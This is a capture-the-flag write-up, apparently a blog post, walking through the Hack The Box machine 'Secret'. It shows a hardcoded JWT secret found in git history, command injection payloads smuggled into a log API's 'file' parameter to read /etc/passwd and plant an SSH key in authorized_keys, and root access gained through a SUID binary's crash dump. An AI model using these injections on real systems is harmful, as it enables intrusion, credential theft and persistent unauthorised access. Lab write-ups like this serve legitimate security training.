---
title: "HTB - Secret"
date: 2025-07-26
author: "ChaosSec"
tags: ["HTB", "Node.js", "JWT", "Linux", "Privilege Escalation"]
summary: ""
---

## 🔍 Port Scanning

```bash
PORT     SERVICE
22/tcp   OpenSSH 8.2p1
80/tcp   nginx 1.18.0
3000/tcp Node.js API
```

## 🔐 API Enumeration

The web application exposes a JSON-based API on port 3000.

### User Registration

```bash
curl -X POST http://10.10.11.120:3000/api/user/register \
  -H 'Content-Type: application/json' \
  -d '{"name":"kali123","email":"kali@dasith.works","password":"kali123"}'
```

### Login and Token Retrieval

```bash
curl -X POST http://10.10.11.120:3000/api/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"kali@dasith.works","password":"kali123"}'
```

## 🔑 Source Code and JWT Secret

By inspecting a previous commit using:

```bash
git diff HEAD~2
```

...we discovered a hardcoded **JWT secret key** in the source code.  
Combining this with the token from login, we authenticated to the API.

### Exploiting the Log Injection Endpoint

Using the token, we executed commands via crafted GET requests:

```bash
curl -i -H 'auth-token:<token>' \
  -G --data-urlencode "file=index.js;cat /etc/passwd" \
  'http://10.10.11.120/api/logs'
```

```bash
curl -i -H 'auth-token:<token>' \
  -G --data-urlencode "file=index.js;cat /home/dasith/user.txt" \
  'http://10.10.11.120/api/logs'
```

## 🔑 SSH Access via Key Injection

Injected our SSH public key:

```bash
export SSH_KEY=$(cat ~/.ssh/id_rsa.pub)

curl -i -H 'auth-token:<token>' \
  -G --data-urlencode "file=index.js;mkdir -p /home/dasith/.ssh; echo $SSH_KEY >> /home/dasith/.ssh/authorized_keys" \
  'http://10.10.11.120/api/logs'
```

Then connected via:

```bash
ssh dasith@10.10.11.120
```

## ⬆️ Privilege Escalation

Discovered a SUID binary `/opt/count` that logs crash info.

### Exploit Method

1. Ran `count` and suspended it with `Ctrl + Z`
2. Found its PID using `ps`
3. Sent a `BUS` signal to it:
   ```bash
   kill -BUS <PID>
   ```
4. Brought it to foreground using `fg`
5. Retrieved crash info with:

```bash
strings /tmp/crash-report/CoreDump
```

🏁 **Root flag recovered from crash dump.**
